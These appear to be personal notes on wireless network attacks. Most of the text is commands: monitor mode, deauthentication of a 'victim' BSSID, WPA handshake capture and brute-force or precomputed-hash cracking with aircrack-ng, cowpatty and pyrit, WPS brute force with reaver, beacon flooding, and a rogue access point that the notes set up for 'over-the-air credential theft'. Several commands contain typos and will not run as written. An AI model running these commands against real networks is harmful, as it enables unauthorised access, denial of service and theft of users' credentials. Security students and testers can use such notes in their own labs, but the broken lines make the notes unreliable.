```bash
sudo airmon-ng start wlp4s0 #Put card in network mode

sudo airmon-ng stop wlp4s0mon #Put card in managed-mode

sudo airodump-ng wlp4s0mon #To scan netwroks

sudo aireplay-ng -0 100 -a (bssid of victim) wlp4s0mon

sudo mdk3 wlp4s0mon b -n anyNameHere #it will show wifi with name

sudo mdk3 wlp4s0mon b #fake wifi spawn

sudo ifconfig wlp4s0mon down #Turns off network card

sudo ifconfig wlp4s0mon up #Turns on network card

sudo mdk3 wlp4s0mon b -f path to file with wifi-names

sudo aireplay-ng -1 0 -a bssid here wlp4s0mon #fake authentication

sudo airmon-ng check kill #To kill interfering processes

sudo airodump-ng -c channel --bssid Bssid here -w psk wlp4s0mon

#Using crunch along with aircrack
crunch 8 8 0123456789 | aircrack-ng -essid -w - 'path to handshake file'

bettercap -iface wlp4s0
> wifi.recon on # Turn on wifi to add access points in db
> wifi.show #show access points in db
> set wifi.recon.channel "channel number"
> set net.sniff.verbose true
> set net.sniff.filter ether proto 0x888e
> set net.sniff.output wpa.pcap
> net.sniff on
> wifi.deauth "bssid here"

#cowpatty and genpmk work together as the genpmk takes the wordlist along with the ssid of wifi to convert the password list into PSKs of the that wifi network. Remeber the PSK key encryption for every network will be different the Name of the wifi "ssid" is used as the Salt to convert plain password into the PSK. It uses PBKDF2 algorithm to make PSK it takes passpharase along with ssid as salt and apply hasing algorithm number of times for generating hash.

cowpatty -f "path to wordlist" -r "packet capture file" -s "ssid"
genpmk -f "path to wordlist" -d "output file name" -s "ssid"
cowpatty -d "hash file from genpmk" -r "packet capture file" -s "ssid"

pyrit list_cores
pyrit -r "packet capture file" -i "path to wordlist" attack_passthrough
pyrit -i "path to wordlist" import_passwords
pyrit -e "ssid" create_essid
pyrit eval
pyrit batch
pyrit -r "packet capture file" attack_db

wash -i wlp4s0mon #Scan for availabe wps networks
reaver -i wlp4s0mon -b "bssid" -c "channel" -vv -f

sudo airebase-ng -a "bssid" -e "essid" -c "channel" wlp4s0mon


sudo arp-scan  --interface=wlp4s0 --localnet

nmap "ipaddress/netmask"

crunch 11 11 -t 03%%%%%%%%% # This will generate all the possible numbers

```

WPA/WPA2 key can be 8-63 characters long

Over-the-Air credential theft.
once rouge access point is created deauth the client it'll automatically connect to your rouge access point 

```bash
sudo apt install bridge-utils
sudo brctl addbr fake
sudo brctl addif eth0
sudo brctl addif fake at0 
sudo ifconfig at0 0.0.0.0 up
sudo ifconfig fake up
```

```bash
sudo apt install dnsmasq hostapd_
sudo dnsmasq -C "path to config file"
sudo hostapd "path to config file"

sudo airebase-ng -e "Name" -c "Channel Number" wlp4s0mon #creates a fake access point
```


![[Screenshot from 2023-01-18 19-06-19.png]]

![[Screenshot from 2023-01-18 19-09-55.png]]

## SHA-256

![[Screenshot from 2023-01-18 21-00-55.png]]

![[Screenshot from 2023-01-18 21-06-18.png]]

### Concept of Salt:

![[Screenshot from 2023-01-18 21-12-17.png]]

## Difference between Hashing and Encryption

![[Screenshot from 2023-01-18 21-18-01.png]]

